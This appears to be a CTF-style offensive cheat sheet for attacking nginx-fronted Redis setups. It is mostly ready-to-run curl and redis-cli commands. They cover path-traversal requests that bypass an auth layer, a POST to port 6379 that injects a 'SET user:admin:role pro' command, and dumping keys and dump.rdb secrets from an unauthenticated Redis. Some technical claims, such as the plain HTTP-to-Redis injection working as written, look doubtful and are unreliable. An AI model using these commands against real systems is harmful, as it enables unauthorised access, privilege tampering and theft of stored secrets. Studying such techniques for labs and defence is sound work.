# Redis Poisoning via nginx proxy_pass Misconfiguration

When nginx has a `proxy_pass` config with a trailing slash mismatch (e.g. `location /api/ { proxy_pass http://backend; }` without matching slash), it can create a path traversal into the backend. If Redis is the backend or the app communicates with Redis over HTTP-like protocols, this can be abused.

## nginx proxy_pass slash bug → internal API access

```nginx
# Vulnerable config:
location /api {
    proxy_pass http://127.0.0.1:3000/;
}
# /api/foo → proxied as /foo (strips /api prefix)
# /api/../admin → may reach /admin on backend without the /api auth layer
```

```bash
# Access internal endpoint bypassing external auth
curl http://<TARGET>/api/../internal/admin
curl http://<TARGET>/api%2f..%2finternal/admin  # URL-encode for nginx parsing
```

## Redis inline command injection via HTTP (RESP injection)

If the app proxies requests directly to Redis port (rare but exists in CTF-like configs):
```bash
# Redis responds to HTTP requests by trying to parse them as RESP
# Inject RESP protocol commands via a crafted request:
# Set a Redis key to give a user "pro" status:
curl -X POST http://<TARGET>:6379/ \
  --data $'SET user:admin:role pro\r\n'
```

## Practical: read Redis keys via LFI/RFI

If you have arbitrary file read:
```bash
# Redis may store secrets in /var/lib/redis/dump.rdb or in-memory via /proc/<pid>/mem
strings /var/lib/redis/dump.rdb
# OR connect directly if Redis is unauthenticated:
redis-cli -h <TARGET> -p 6379
redis-cli -h <TARGET> keys '*'
redis-cli -h <TARGET> get '<key>'
```
